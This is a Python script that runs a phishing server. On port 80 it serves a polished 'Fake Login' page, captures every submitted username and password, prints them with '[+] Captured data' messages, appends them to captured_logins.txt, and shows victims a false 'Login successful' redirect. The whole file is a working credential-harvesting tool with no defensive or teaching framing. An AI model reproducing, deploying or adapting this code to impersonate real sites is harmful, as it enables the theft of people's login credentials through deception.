
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import cgi

class FakeSiteHandler(BaseHTTPRequestHandler):

    def send_html_response(self, html, status=200):
        self.send_response(status)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))

    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            html = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Fake Login</title>
<style>
  body {
    background: #1e1e2f;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    color: #f0f0f5;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }
  .login-container {
    background: #2c2c44;
    padding: 30px 40px;
    border-radius: 12px;
    box-shadow: 0 0 15px rgba(30,30,47,0.6);
    width: 320px;
    text-align: center;
  }
  h2 {
    margin-bottom: 25px;
    font-weight: 700;
    letter-spacing: 1.2px;
  }
  input[type="text"], input[type="password"] {
    width: 100%;
    padding: 12px 15px;
    margin: 10px 0 20px 0;
    border: none;
    border-radius: 8px;
    font-size: 16px;
    background: #3a3a5a;
    color: #f0f0f5;
  }
  input[type="text"]::placeholder,
  input[type="password"]::placeholder {
    color: #aaaabb;
  }
  input[type="submit"] {
    background-color: #4a90e2;
    border: none;
    border-radius: 8px;
    color: white;
    padding: 12px;
    font-size: 17px;
    cursor: pointer;
    transition: background-color 0.3s ease;
    width: 100%;
  }
  input[type="submit"]:hover {
    background-color: #357ABD;
  }
  .footer {
    margin-top: 15px;
    font-size: 12px;
    color: #666688;
  }
</style>
</head>
<body>
  <div class="login-container">
    <h2>Fake Login</h2>
    <form method="POST" action="/">
      <input type="text" name="username" placeholder="Username" required autofocus><br>
      <input type="password" name="password" placeholder="Password" required><br>
      <input type="submit" value="Login">
    </form>
    <div class="footer">© 2025 Your Company</div>
  </div>
</body>
</html>"""
            self.send_html_response(html)
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")

    def do_POST(self):
        if self.path in ('/', '/log'):
            ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
            if ctype == 'multipart/form-data':
                form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD': 'POST'})
                print("[+] Captured data (multipart):")
                with open("captured_logins.txt", "a") as f:
                    for field in form.keys():
                        line = f"{field}: {form[field].value}"
                        print("   ", line)
                        f.write(line + "\n")
                    f.write("-" * 50 + "\n")
            else:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                post_str = post_data.decode('utf-8', errors='ignore')
                form = urllib.parse.parse_qs(post_str)
                print("[+] Captured data (urlencoded):")
                with open("captured_logins.txt", "a") as f:
                    for key, value in form.items():
                        line = f"{key}: {value[0]}"
                        print("   ", line)
                        f.write(line + "\n")
                    f.write("-" * 50 + "\n")

            response_html = """<html><body style="background:#1e1e2f;color:#f0f0f5;display:flex;justify-content:center;align-items:center;height:100vh;">
            <h2>Login successful! Redirecting...</h2>
            <script>setTimeout(() => { window.location.href = '/'; }, 3000);</script>
            </body></html>"""
            self.send_html_response(response_html)
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")

def run(server_class=HTTPServer, handler_class=FakeSiteHandler, port=80):
    server_address = ('0.0.0.0', port)
    httpd = server_class(server_address, handler_class)
    print(f"[+] Fake website running on port {port}...")
    httpd.serve_forever()

if __name__ == '__main__':
    run()
